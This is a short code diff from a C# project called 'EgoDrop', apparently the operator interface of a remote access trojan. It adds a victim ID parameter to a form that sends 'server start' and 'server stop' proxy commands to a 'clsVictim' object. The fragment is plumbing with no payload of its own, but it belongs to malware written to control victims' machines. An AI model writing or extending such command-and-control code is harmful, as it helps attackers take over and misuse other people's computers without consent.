@@ -13,12 +13,14 @@ namespace EgoDrop
 {
     public partial class frmServerProxy : Form
     {
+        private string m_szVictimID { get; set; }
         private clsVictim m_victim { get; init; }
 
-        public frmServerProxy(clsVictim victim)
+        public frmServerProxy(string szVictimID, clsVictim victim)
         {
             InitializeComponent();
 
+            m_szVictimID = szVictimID;
             m_victim = victim;
         }
 
@@ -30,7 +32,7 @@ namespace EgoDrop
         private void button1_Click(object sender, EventArgs e)
         {
             clsCrypto crypto = new clsCrypto(true);
-            m_victim.fnSendCommand(new string[]
+            m_victim.fnSendCommand(m_szVictimID, new string[]
             {
                 "server",
                 "start",
@@ -42,7 +44,7 @@ namespace EgoDrop
 
         private void button2_Click(object sender, EventArgs e)
         {
-            m_victim.fnSendCommand(new string[]
+            m_victim.fnSendCommand(m_szVictimID, new string[]
             {
                 "server",
                 "stop",
